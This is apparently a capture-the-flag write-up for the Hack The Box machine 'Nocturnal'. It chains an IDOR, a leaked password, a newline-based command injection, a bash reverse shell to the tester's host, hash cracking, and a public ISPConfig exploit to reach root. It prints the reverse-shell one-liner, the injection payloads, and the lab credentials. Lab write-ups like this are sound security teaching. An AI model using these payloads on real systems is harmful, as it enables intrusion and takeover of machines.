[nocturnal](https://app.hackthebox.com/machines/nocturnal) starts by exploiting an idor to get a set of credentials that gives us access to an admin panel on the website. After that we exploit a command injection to get initial foothold. After that we crack a hash that we find on a db file to get access as another user. We find port listening locally and we forward it to exploit a code injection vulnerability to get root.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.56.74
Host is up (0.52s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)

|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, 22 running open ssh on Ubuntu and port 80 running nginx web server and redirecting to `nocturnal.htb` domain.

### Web

After adding the domain to our `/etc/hosts` file, let's navigate to it

![page](1.png)

We see a login and register, Trying some default credentials but failed.

Let's register a new user.

![reg](2.png)

Now let's login.

![dashbord](3.png)

Trying to upload a random file here give us the error `Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.`

Let's upload a pdf file.

![upload](4.png)

We uploaded the file successfully, when I click on the file the website makes a request to `http://nocturnal.htb/view.php?username=sirius&file=file.pdf` which downloads the file to our machine.

Trying a different name give the following error.

![error](5.png)

It shows us the file available for the user we're logged in as (sirius).

Changing the value of username parameter gives another error.

![hake](6.png)

Trying the username `admin` gives the following:

![admin](7.png)

The user exists but there are no files to download, this clearly indicates an IDOR vulnerability

#### IDOR

Let's fuzz for other usernames using `ffuf` and give it our session cookie

```bash
ffuf -c -w /usr/share/seclists/Usernames/Names/names.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=file.pdf' -ac -H 'Cookie: PHPSESSID=5b9q8ei3otchhrovc1ts929nps'
```

```terminal
admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 129ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 134ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 140ms]
```

We got two more usernames, let's check them out.

![amanda](8.png)

We find a file in amanda's account named `privacy.odt`, let's download it.

> An .odt file is an OpenDocument Text file, a format used for word processing documents.

Trying to open the file fails, but we can unzip it and get the data inside it.

```terminal
[â˜…]$ unzip privacy.odt             
Archive:  privacy.odt   
 extracting: mimetype   
   creating: Configurations2/accelerator/

  inflating: manifest.rdf
  inflating: content.xml
  inflating: meta.xml   
  inflating: settings.xml
 extracting: Thumbnails/thumbnail.png
  inflating: META-INF/manifest.xml
```

Grepping for `password` we find the following message inside `content.xml` file.

```text
Dear Amanda,

Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
```

Trying to ssh as amanda fails. Let's login in the website as amanda.

![web](9.png)

We can see a admin panel

![admin](10.png)

We can view files and make backups.

![backup](11.png)

Checking the admin.php file we can see that it uses zip to make the backup.

```bash
zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &
```

We can aso see a list of black listed characters that we can't put in the password parameter send with the backup request

```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

[...]

$password = cleanEntry($_POST['password']);
```

One char that's missing from the list is line feed '\n'.

![poc](12.png)

We managed to run `ls` to list files.

## **Foothold**

Now I'll try `curl` to reach my python server.

```bash
curl+10.10.16.83
```

That failed, maybe it's because the space, I'll replace it with a tab `%09'

```bash
curl%0910.10.16.83
```

With that I managed to get a hit on my server, now I'll upload bash reverse shell and put in /tmp.

```bash
bash -i >& /dev/tcp/10.10.16.83/9001 0>&1
```

```text
password=arHkG7HAI68X8s1J%0acurl%0910.10.16.83/shell.sh%09-o%09/tmp/file.sh
```

I'll setup a listener and then execute the file

```text
password=arHkG7HAI68X8s1J%0abash%09/tmp/file.sh
```

```terminal

uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

We got a shell!

## **Privilege Escalation**

In the login.php file we see that it connects to a sqlite3 database.

```php
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');
```

Let's enumerate the db.

```terminal
www-data@nocturnal:~/nocturnal_database$ sqlite3 nocturnal_database.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.

sqlite>
```

We got the hash of user tobias, let's crack it.

![crack](13.png)

The password is `slowmotionapocalypse`. We can now ssh to the box.

Listing listening ports we get the following:

```terminal
tobias@nocturnal:~$ netstat -tulpn

```

Port 8080 is listening locally, let's forward it and check what it has.

```bash
ssh tobias@nocturnal.htb -L 8000:127.0.0.1:8080
```

![web](14.png)

We got a login page, I managed to login with `admin:slowmotionapocalypse`

![logged](15.png)

Going to the help page we find the version of the website `ISPConfig Version: 3.2.10p1`

A quick search on google we find it's vulnerable to php code injection [CVE-2023-46818](https://nvd.nist.gov/vuln/detail/CVE-2023-46818)

We can also find an exploit on github <https://github.com/bipbopbup/CVE-2023-46818-python-exploit>

Let's clone the repo an run the exploit.

```terminal
â”Œâ”€â”€[10.10.16.83]-[siriusðŸ’€parrot]-[25-08-16 21:50]-[~/ctf/htb/noc/CVE-2023-46818-python-exploit]

We got root!
